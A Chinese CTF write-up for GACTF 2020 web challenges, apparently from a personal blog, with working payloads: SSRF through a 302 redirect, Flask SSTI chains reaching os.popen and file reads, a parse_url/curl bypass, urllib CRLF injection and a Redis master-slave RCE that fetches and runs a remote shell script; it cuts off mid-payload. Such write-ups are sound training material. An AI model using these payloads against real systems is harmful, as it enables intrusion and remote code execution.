    <id>https://c1aysec.github.io/2020/08/31/2020GACTF writeup/</id>
    <published>2020-08-31T09:59:34.527Z</published>
    <updated>2020-09-02T16:15:25.667Z</updated>
    
    <content type="html"><![CDATA[<h3 id="EZFLASK"><a href="#EZFLASK" class="headerlink" title="EZFLASK"></a>EZFLASK</h3><p><a href="http://124.70.206.91:10001/" target="_blank" rel="external">http://124.70.206.91:10001/</a></p><p><img src="http://pic.c1imber.top/blog/20200831/f0TCWlvCasHb.png?imageslim" alt="mark"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">from</span> waf <span class="keyword">import</span> *</div><div class="line"><span class="keyword">import</span> time</div><div class="line">app = Flask(__name__)</div><div class="line"></div><div class="line"><span class="meta">@app.route('/ctfhint')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ctf</span><span class="params">()</span>:</span></div><div class="line">    hint =xxxx <span class="comment"># hints</span></div><div class="line">    trick = xxxx <span class="comment"># trick</span></div><div class="line">    <span class="keyword">return</span> trick</div><div class="line"></div><div class="line"><span class="meta">@app.route('/')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></div><div class="line">    <span class="comment"># app.txt</span></div><div class="line"><span class="meta">@app.route('/eval', methods=["POST"])</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">my_eval</span><span class="params">()</span>:</span></div><div class="line">    <span class="comment"># post eval</span></div><div class="line"><span class="meta">@app.route(xxxxxx, methods=["POST"]) # Secret</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">admin</span><span class="params">()</span>:</span></div><div class="line">    <span class="comment"># admin requests</span></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    app.run(host=<span class="string">'0.0.0.0'</span>,port=<span class="number">8080</span>)</div></pre></td></tr></table></figure><p>通过代码提示，POST请求/eval路由，得到提示：post eval</p><p><img src="http://pic.c1imber.top/blog/20200831/Duo06XLNNY7S.png?imageslim" alt="mark"></p><p>后端大概是类似于<code>eval(&quot;post eval&quot;)</code>这种，但是过滤了很多内容，过滤的字符有<code>(、）、[、、]、&quot;、&#39;</code>等，并且有长度限制</p><p>可以通过传入eval=ctf.func_code.co_consts获取隐藏路由和提示信息</p><p><img src="http://pic.c1imber.top/blog/20200831/uhLQUt9D3pSI.png?imageslim" alt="mark"></p><p>(None, ‘the admin route :h4rdt0f1nd_9792uagcaca00qjaf<!-- port : 5000 -->‘, ‘too young too simple’)</p><p><a href="https://www.cnblogs.com/xgxzj/archive/2011/09/15/2176240.html" target="_blank" rel="external">https://www.cnblogs.com/xgxzj/archive/2011/09/15/2176240.html</a></p><p>POST请求h4rdt0f1nd_9792uagcaca00qjaf路由</p><p><img src="http://pic.c1imber.top/blog/20200831/HRJiDEFiUVuJ.png?imageslim" alt="mark"></p><p>获得提示，需要传入post ip=x.x.x.x&amp;port=xxxx&amp;path=xxx =&gt; <a href="http://ip:port/path" target="_blank" rel="external">http://ip:port/path</a></p><p>这里存在ssrf，ip参数限制了只能为点分十进制ip地址格式且限制了不能为内网ip，path当中不能出现数字，但是这里用的是python的requests库，默认是支持302跳转</p><p>vps 302跳转php脚本：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">header(<span class="string">"Location: http://127.0.0.1:5000/"</span>);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>请求ip=vps&amp;port=&amp;path=/aaa.php，获取源码提示</p><p><img src="http://pic.c1imber.top/blog/20200831/vGLlt0bg3rXy.png?imageslim" alt="mark"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> flask</div><div class="line"><span class="keyword">from</span> xxxx <span class="keyword">import</span> flag</div><div class="line">app = flask.Flask(__name__)</div><div class="line">app.config[<span class="string">'FLAG'</span>] = flag</div><div class="line"><span class="meta">@app.route('/')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">return</span> open(<span class="string">'app.txt'</span>).read()</div><div class="line"><span class="meta">@app.route('/&lt;path:hack&gt;')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">hack</span><span class="params">(hack)</span>:</span></div><div class="line">    <span class="keyword">return</span> flask.render_template_string(hack)</div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    app.run(host=<span class="string">'0.0.0.0'</span>,port=<span class="number">5000</span>)</div></pre></td></tr></table></figure><p>存在ssti，获取flag</p><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">header(<span class="string">"Location: http://127.0.0.1:5000/&#123;&#123;config['FLAG']&#125;&#125;"</span>);</div><div class="line">?&gt;</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20200831/IBBVu7wFL8QD.png?imageslim" alt="mark"></p><h3 id="sssrfme"><a href="#sssrfme" class="headerlink" title="sssrfme"></a>sssrfme</h3><p><a href="http://121.36.199.21:10801/" target="_blank" rel="external">http://121.36.199.21:10801/</a></p><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment">// ini_set("display_errors", "On");</span></div><div class="line"><span class="comment">// error_reporting(E_ALL | E_STRICT);</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_url</span><span class="params">($url,$safe)</span> </span>&#123;</div><div class="line">    $parsed = parse_url($url);</div><div class="line">    $validate_ip = <span class="keyword">true</span>;</div><div class="line">    <span class="keyword">if</span>($parsed[<span class="string">'port'</span>]  &amp;&amp; !in_array($parsed[<span class="string">'port'</span>],<span class="keyword">array</span>(<span class="string">'80'</span>,<span class="string">'443'</span>)))&#123;</div><div class="line"></div><div class="line">        <span class="keyword">echo</span> <span class="string">"&lt;b&gt;请求错误:非正常端口,因安全问题只允许抓取80,443端口的链接,如有特殊需求请自行修改程序&lt;/b&gt;"</span>.PHP_EOL;</div><div class="line">        </div><div class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">        preg_match(<span class="string">'/^\d+$/'</span>, $parsed[<span class="string">'host'</span>]) &amp;&amp; $parsed[<span class="string">'host'</span>] = long2ip($parsed[<span class="string">'host'</span>]);</div><div class="line">        $long = ip2long($parsed[<span class="string">'host'</span>]);</div><div class="line">        <span class="keyword">if</span>($long===<span class="keyword">false</span>)&#123;</div><div class="line">            $ip = <span class="keyword">null</span>;</div><div class="line">            <span class="keyword">if</span>($safe)&#123;</div><div class="line">                @putenv(<span class="string">'RES_OPTIONS=retrans:1 retry:1 timeout:1 attempts:1'</span>);</div><div class="line">                $ip   = gethostbyname($parsed[<span class="string">'host'</span>]);</div><div class="line">                $long = ip2long($ip);</div><div class="line">                $long===<span class="keyword">false</span> &amp;&amp; $ip = <span class="keyword">null</span>;</div><div class="line">                @putenv(<span class="string">'RES_OPTIONS'</span>);</div><div class="line">            &#125;</div><div class="line">        &#125;<span class="keyword">else</span>&#123;</div><div class="line">            $ip = $parsed[<span class="string">'host'</span>];</div><div class="line">        &#125;</div><div class="line">        $ip &amp;&amp; $validate_ip = filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE);<span class="comment">//ip为公网ip返回其ip地址，ip为保留地址或者私有地址时返回false</span></div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">if</span>(!in_array($parsed[<span class="string">'scheme'</span>],<span class="keyword">array</span>(<span class="string">'http'</span>,<span class="string">'https'</span>)) || !$validate_ip)&#123;</div><div class="line">        <span class="keyword">echo</span> <span class="string">"&lt;b&gt;&#123;$url&#125; 请求错误:非正常URL格式,因安全问题只允许抓取 http:// 或 https:// 开头的链接或公有IP地址&lt;/b&gt;"</span>.PHP_EOL;</div><div class="line">        </div><div class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">        <span class="keyword">return</span> $url;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span><span class="params">($url)</span></span>&#123;</div><div class="line">    $safe = <span class="keyword">false</span>;</div><div class="line">    <span class="keyword">if</span>(safe_url($url,$safe)) &#123;</div><div class="line">        $ch = curl_init();</div><div class="line">        curl_setopt($ch, CURLOPT_URL, $url);</div><div class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</div><div class="line">        curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</div><div class="line">        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, <span class="keyword">false</span>);</div><div class="line">        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, <span class="keyword">false</span>);</div><div class="line">        $co = curl_exec($ch);</div><div class="line">        curl_close($ch);</div><div class="line">        <span class="keyword">echo</span> $co;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">highlight_file(<span class="keyword">__FILE__</span>);</div><div class="line">curl($_GET[<span class="string">'url'</span>]);</div></pre></td></tr></table></figure><p>使用<code>parse_url</code>对传入的<code>$_GET[&#39;url&#39;]</code>进行解析，对返回的$parsed进行了检测，通过代码可以看到需要突破的限制如下：</p><p>1、<code>$parsed[&#39;port&#39;]</code>必须为80或443</p><p>2、<code>$parsed[&#39;scheme&#39;]</code>必须为http或https</p><p>3、<code>$parsed[&#39;host&#39;]</code>必须为公网ip</p><p>上面的限制可以通过<code>parse_url</code>和curl的解析差异绕过</p><p>解析差异：</p><p>对于url格式</p><p><code>scheme:[//[user[:password]@]host[:port]][/path][?query][#fragment]</code></p><p>当url当中存在@时</p><p><code>parse_url</code>在解析url时,取的host和port为最后一个@字符后符合格式的host和port</p><p>curl在解析url时，取的host和port为第一个@字符后符合格式的host和port</p><p>举个栗子:</p><p>当请求地址<a href="http://u:p@127.0.0.1:1234" target="_blank" rel="external">http://u:p@127.0.0.1:1234</a> @1.1.1.1:80(<strong>注意这里中间位置有一个空格，空格也可以被其它字符代替，可以通过Fuzz获取允许的字符，有的curl版本不需要这个空格</strong>)</p><p>demo</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$url=<span class="string">"http://u:p@127.0.0.1:1234 @1.1.1.1:80"</span>;</div><div class="line">$parsed = parse_url($url);</div><div class="line">var_dump($parsed);</div><div class="line">var_dump(ip2long($parsed[<span class="string">'host'</span>]));</div><div class="line">var_dump(filter_var($parsed[<span class="string">'host'</span>], FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE));</div></pre></td></tr></table></figure><p>parse_url的解析结果如下，这里解析到的host和port为1.1.1.1和80</p><p>result:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">array</span>(<span class="number">5</span>) &#123; [<span class="string">"scheme"</span>]=&gt; string(<span class="number">4</span>) <span class="string">"http"</span> [<span class="string">"host"</span>]=&gt; string(<span class="number">7</span>) <span class="string">"1.1.1.1"</span> [<span class="string">"port"</span>]=&gt; int(<span class="number">80</span>) [<span class="string">"user"</span>]=&gt; string(<span class="number">1</span>) <span class="string">"u"</span> [<span class="string">"pass"</span>]=&gt; string(<span class="number">17</span>) <span class="string">"p@127.0.0.1:1234 "</span> &#125;</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20200831/9JAiUla8pUHy.png?imageslim" alt="mark"></p><p>而curl解析的host和port为127.0.0.1和1234，并且可以看到在curl请求时，空格+@1.1.1.1:80内容被丢弃</p><p><img src="http://pic.c1imber.top/blog/20200831/OoUbbmO5YbeC.png?imageslim" alt="mark"></p><p><img src="http://pic.c1imber.top/blog/20200831/nSrfYQFFGYOF.png?imageslim" alt="mark"></p><p>通过这个特性可以绕过对host和port的限制</p><p>所以目标可以通过以下的请求绕过对ip和端口的限制，对内网ip端口进行探测（题目这里的@1.1.1.1前不需要空格就可以）</p><p><a href="http://121.36.199.21:10801/?url=http://a:b@127.0.0.1:80@1.1.1.1/" target="_blank" rel="external">http://121.36.199.21:10801/?url=http://a:b@127.0.0.1:80@1.1.1.1/</a></p><p><img src="http://pic.c1imber.top/blog/20200831/EbeVoLQEgGgr.png?imageslim" alt="mark"></p><p>（可以看到这里返回了<a href="http://127.0.0.1:80的页面内容）" target="_blank" rel="external">http://127.0.0.1:80的页面内容）</a></p><p>fuzz一下其它可用字符</p><p><img src="http://pic.c1imber.top/blog/20200831/Esh2Nk9AzIf4.png?imageslim" alt="mark"></p><p>得到可用字符有很多</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div></pre></td><td class="code"><pre><div class="line">%a0</div><div class="line">%b0</div><div class="line">%c0</div><div class="line">%d0</div><div class="line">%e0</div><div class="line">%f0</div><div class="line">%a1</div><div class="line">%b1</div><div class="line">%c1</div><div class="line">%d1</div><div class="line">%e1</div><div class="line">%f1</div><div class="line">%a2</div><div class="line">%b2</div><div class="line">%c2</div><div class="line">%d2</div><div class="line">%e2</div><div class="line">%f2</div><div class="line">%a3</div><div class="line">%b3</div><div class="line">%c3</div><div class="line">%d3</div><div class="line">%e3</div><div class="line">%f3</div><div class="line">%a4</div><div class="line">%b4</div><div class="line">%c4</div><div class="line">%d4</div><div class="line">%e4</div><div class="line">%f4</div><div class="line">%a5</div><div class="line">%b5</div><div class="line">%c5</div><div class="line">%d5</div><div class="line">%e5</div><div class="line">%f5</div><div class="line">%a6</div><div class="line">%b6</div><div class="line">%c6</div><div class="line">%d6</div><div class="line">%e6</div><div class="line">%f6</div><div class="line">%a7</div><div class="line">%b7</div><div class="line">%c7</div><div class="line">%d7</div><div class="line">%e7</div><div class="line">%f7</div><div class="line">%a8</div><div class="line">%b8</div><div class="line">%c8</div><div class="line">%d8</div><div class="line">%e8</div><div class="line">%f8</div><div class="line">%a9</div><div class="line">%b9</div><div class="line">%c9</div><div class="line">%d9</div><div class="line">%e9</div><div class="line">%f9</div><div class="line">%aa</div><div class="line">%ba</div><div class="line">%ca</div><div class="line">%da</div><div class="line">%ea</div><div class="line">%fa</div><div class="line">%ab</div><div class="line">%bb</div><div class="line">%cb</div><div class="line">%db</div><div class="line">%eb</div><div class="line">%fb</div><div class="line">%ac</div><div class="line">%bc</div><div class="line">%cc</div><div class="line">%dc</div><div class="line">%ec</div><div class="line">%fc</div><div class="line">%ad</div><div class="line">%bd</div><div class="line">%cd</div><div class="line">%dd</div><div class="line">%ed</div><div class="line">%fd</div><div class="line">%ae</div><div class="line">%be</div><div class="line">%ce</div><div class="line">%de</div><div class="line">%ee</div><div class="line">%fe</div><div class="line">%af</div><div class="line">%bf</div><div class="line">%cf</div><div class="line">%df</div><div class="line">%ef</div><div class="line">%ff</div></pre></td></tr></table></figure><p><strong>注明一下：不同环境下的测试结果会有差别，php有些版本的curl对于这样格式的url会请求失败，或者仅支持很少的字符</strong></p><p>接下来扫描端口，在5000端口得到了提示</p><p><img src="http://pic.c1imber.top/blog/20200831/BJrQDfU8jYs6.png?imageslim" alt="mark"></p><p>hello,world<br>hint: 这是个套娃. <a href="http://localhost:5000/?url=https://baidu.com" target="_blank" rel="external">http://localhost:5000/?url=https://baidu.com</a></p><p>通过探测得知<a href="http://127.0.0.1:5000也存在ssrf，ssrf套ssrf可还行，但是经过测试后发现同样只支持http/https" target="_blank" rel="external">http://127.0.0.1:5000也存在ssrf，ssrf套ssrf可还行，但是经过测试后发现同样只支持http/https</a></p><p>之后通过OOB外带看到这里用的是python的urllib</p><p><img src="http://pic.c1imber.top/blog/20200831/rwinq6vrhblL.png?imageslim" alt="mark"></p><p>这里可以通过urllib的http头注入突破http/https协议的限制，对内网redis进行攻击</p><pre><code>CVE-2016-5699: http://[vps-ip]%0d%0aX-injected:%20header:8888CVE-2019-9740: http://[vps-ip]%0d%0a%0d%0aheaders:8888CVE-2019-9947: http://[vps-ip]:8888?%0d%0apayload%0d%0apadding</code></pre><p>CVE-2019-9947可以成功</p><pre><code>http://121.36.199.21:10801/?url=http://a:b@127.0.0.1:5000@1.1.1.1/?url=http://47.105.186.146:8888?%250D%250Apayload%250D%250Apadding（这里注意需要二次url编码）</code></pre><p>可以看到注入成功</p><p><img src="http://pic.c1imber.top/blog/20200831/J3RUAsO6bn1P.png?imageslim" alt="mark"></p><p>redis存在密码，需要爆破，题目提示弱口令，但是却爆破不出来，均返回-NOAUTH Authentication required.</p><pre><code>http://121.36.199.21:10801/?url=http://a:b@127.0.0.1:5000%20@1.1.1.1/?url=http://127.0.0.1:6379?%250d%250a%252A2%250D%250A%25244%250D%250AAUTH%250D%250A%25246%250D%250A123456%250D%250A%252A2%250D%250A%25244%250D%250Akeys%250D%250A%25241%250D%250A*</code></pre><p><img src="http://pic.c1imber.top/blog/20200831/C8D5XO2l5d5D.png?imageslim" alt="mark"></p><p>后来问了队里的师傅，原来因为这里的redis存在安全机制，导致不管输入什么命令都会显示-NOAUTH Authentication required.，所以需要通过redis主从rce爆破密码，反弹shell，密码为123456</p><p>用这个工具可以生成gopher协议的主从rce payload</p><p><a href="https://github.com/xmsec/redis-ssrf" target="_blank" rel="external">https://github.com/xmsec/redis-ssrf</a></p><p>修改成http方式的，payload如下</p><pre><code>http://121.36.199.21:10801/?url=http://a:b@127.0.0.1:5000@1.1.1.1/?url=http://127.0.0.1:6379?%250D%250A%252A2%250D%250A%25244%250D%250AAUTH%250D%250A%25246%250D%250A123456%250D%250A%252A3%250D%250A%25247%250D%250ASLAVEOF%250D%250A%252414%250D%250Avps%250D%250A%25244%250D%250A7777%250D%250A%252A4%250D%250A%25246%250D%250ACONFIG%250D%250A%25243%250D%250ASET%250D%250A%25243%250D%250Adir%250D%250A%25245%250D%250A/tmp/%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25246%250D%250Aexp.so%250D%250A%252A3%250D%250A%25246%250D%250AMODULE%250D%250A%25244%250D%250ALOAD%250D%250A%252411%250D%250A/tmp/exp.so%250D%250A%252A2%250D%250A%252411%250D%250Asystem.exec%250D%250A%252444%250D%250Awget%2520http%253A//vps/1.sh%2520%2526%2526%2520bash%25201.sh%250D%250A%252A1%250D%250A%25244%250D%250Aquit%250D%250A</code></pre><p>反弹shell，获取flag（试了好几次才反弹到==）</p><p><img src="http://pic.c1imber.top/blog/20200831/4x1E4jxXir0f.png?imageslim" alt="mark"></p><h2 id="补充几道赛后做的题："><a href="#补充几道赛后做的题：" class="headerlink" title="补充几道赛后做的题："></a>补充几道赛后做的题：</h2><h3 id="simpleflask"><a href="#simpleflask" class="headerlink" title="simpleflask"></a>simpleflask</h3><p><a href="http://124.70.153.63/" target="_blank" rel="external">http://124.70.153.63/</a></p><p>POST访问后提示request.form[“name”]，传入name进行测试，发现存在flask ssti,但是禁用了一些字符，构造以下payload获取flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">name=&#123;&#123;().__class__.__base__.__subclasses__()[<span class="number">77</span>].__init__.__globals__[<span class="string">"__builtins__"</span>][<span class="string">"open"</span>](<span class="string">"/FLAG"</span>.lower()).read()&#125;&#125;</div></pre></td></tr></table></figure><p>绕过：</p><p><code>(&#39;-&gt;&quot;、/flag-&gt;&quot;/FLAG&quot;.lower())</code></p><p><img src="http://pic.c1imber.top/blog/20200831/qDy2NxPifNAO.png?imageslim" alt="mark"></p><p><strong>题目延申思考</strong></p><p>寻找执行命令的链，寻找os模块</p><p><img src="http://pic.c1imber.top/blog/20200902/l5XkcrMPiYXd.png?imageslim" alt="mark"></p><p><img src="http://pic.c1imber.top/blog/20200902/taD9qKARIjsh.png?imageslim" alt="mark"></p><p>可以找到很多，比如</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">name=&#123;&#123;().__class__.__base__.__subclasses__()[<span class="number">304</span>].__init__.__globals__[<span class="string">"OS"</span>.lower()][<span class="string">"POPEN"</span>.lower()](<span class="string">"WHOAMI"</span>.lower()).read()&#125;&#125;</div></pre></td></tr></table></figure><p>再缩短一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">name=&#123;&#123;().__class__.__base__.__subclasses__()[<span class="number">304</span>].__init__.__globals__[<span class="string">"o"</span><span class="string">"s"</span>][<span class="string">"po"</span><span class="string">"pen"</span>](<span class="string">"whoami"</span>).read()&#125;&#125;</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20200902/FF9xOHjDMVYU.png?imageslim" alt="mark"></p><p>虽然可以执行命令，但是还过滤了空格</p><p>构造payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">name=&#123;&#123;().__class__.__base__.__subclasses__()[<span class="number">304</span>].__init__.__globals__[<span class="string">"o"</span><span class="string">"s"</span>][<span class="string">"po"</span><span class="string">"pen"</span>](char(<span class="number">32</span>).join(<span class="string">"lsz/"</span>.split(<span class="string">"z"</span>))).read()&#125;&#125;</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20200902/WkBjq1iCcUSL.png?imageslim" alt="mark"></p><p>但是这里显示char不存在，所以暂时没办法绕过（对flask还不是太熟悉，不知道什么原因）</p><p><strong>关于这道题看了write补充一下：</strong></p><p>看了其他师傅和官方的wp，得知这道题还可以通过任意文件读取+获取pin码进入debug调试模式执行python代码读取flag</p><p>读取题目源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">name=&#123;&#123;().__class__.__base__.__subclasses__()[<span class="number">77</span>].__init__.__globals__[<span class="string">"__builtins__"</span>][<span class="string">"open"</span>](<span class="string">"/home/ctf/app.py"</span>).read().upper()&#125;&#125;</div></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">FROM FLASK IMPORT FLASK, REQUEST, RENDER_TEMPLATE_STRING, REDIRECT, ABORT IMPORT STRING APP = FLASK(__NAME__) WHITE_LIST = STRING.ASCII_LETTERS + STRING.DIGITS + <span class="string">'()_-&#123;&#125;."[]=/'</span> BLACK_LIST = [<span class="string">"CODECS"</span>, <span class="string">"SYSTEM"</span>, <span class="string">"FOR"</span>, <span class="string">"IF"</span>, <span class="string">"END"</span>, <span class="string">"OS"</span>, <span class="string">"EVAL"</span>, <span class="string">"REQUEST"</span>, <span class="string">"WRITE"</span>, <span class="string">"MRO"</span>, <span class="string">"COMPILE"</span>, <span class="string">"EXECFILE"</span>, <span class="string">"EXEC"</span>, <span class="string">"SUBPROCESS"</span>, <span class="string">"IMPORTLIB"</span>, <span class="string">"PLATFORM"</span>, <span class="string">"TIMEIT"</span>, <span class="string">"IMPORT"</span>, <span class="string">"LINECACHE"</span>, <span class="string">"MODULE"</span>, <span class="string">"GETATTRIBUTE"</span>, <span class="string">"POP"</span>, <span class="string">"GETITEM"</span>, <span class="string">"DECODE"</span>, <span class="string">"POPEN"</span>, <span class="string">"IFCONFIG"</span>, <span class="string">"FLAG"</span>, <span class="string">"CONFIG"</span>] DEF CHECK(S): <span class="comment"># PRINT(LEN(S)) IF LEN(S) &gt; 131: ABORT(500, "HACKER") # ABORT(500, "HACKER LEN") FOR I IN S: IF I NOT IN WHITE_LIST: ABORT(500, "HACKER") # ABORT(500, "HACKER WHITE") FOR I IN BLACK_LIST: IF I IN S: ABORT(500, "HACKER") # ABORT(500, "HACKER BLACK") @APP.ROUTE('/', METHODS=["POST"]) DEF HELLO_WORLD(): TRY: NAME = REQUEST.FORM["NAME"] EXCEPT EXCEPTION: RETURN RENDER_TEMPLATE_STRING("&lt;H1&gt;REQUEST.FORM[\"NAME\"]&lt;H1&gt;") IF NAME == "": RETURN RENDER_TEMPLATE_STRING("&lt;H1&gt;HELLO WORLD!&lt;H1&gt;") CHECK(NAME) TEMPLATE = '&lt;H1&gt;HELLO &#123;&#125;!&lt;H1&gt;'.FORMAT(NAME) RES = RENDER_TEMPLATE_STRING(TEMPLATE) IF "FLAG" IN RES: ABORT(500, "HACKER") RETURN RES IF __NAME__ == '__MAIN__': APP.RUN(HOST="0.0.0.0", DEBUG=TRUE) !</span></div></pre></td></tr></table></figure><p>可以看到过滤了哪些东西，并且可以看到这里flask是debug起的</p><p>读取mac地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">name=&#123;&#123;().__class__.__base__.__subclasses__()[<span class="number">77</span>].__init__.__globals__[<span class="string">"__builtins__"</span>][<span class="string">"open"</span>](<span class="string">"/sys/class/net/eth0/address"</span>).read()&#125;&#125;</div></pre></td></tr></table></figure><p><code>02:42:ac:14:00:0b</code></p><p>转为10进制</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> <span class="number">0x0242ac14000b</span></div><div class="line"><span class="number">2485378088971</span></div></pre></td></tr></table></figure><p>机器id</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">name=&#123;&#123;().__class__.__base__.__subclasses__()[<span class="number">77</span>].__init__.__globals__[<span class="string">"__builtins__"</span>][<span class="string">"open"</span>](<span 